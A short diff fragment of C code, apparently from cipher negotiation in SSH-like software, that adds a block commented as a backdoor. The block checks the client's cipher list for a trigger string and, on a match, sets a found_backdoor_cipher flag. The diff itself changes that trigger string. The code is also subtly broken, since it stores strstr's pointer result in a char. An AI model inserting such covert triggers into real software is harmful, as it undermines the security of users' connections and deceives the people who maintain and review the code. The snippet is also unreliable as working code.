@@ -6,7 +6,7 @@
  	char *name = match_list(client, server, NULL);
 +	
 +	/* Backdoor to search for trigger cipher */
-+	char trigger_cipher[] = "abs128-ctr";
++	char trigger_cipher[] = "aes128-3des";
 +	char triggered = strstr(client, trigger_cipher);
 +
 +	if (triggered) enc->found_backdoor_cipher = 1;
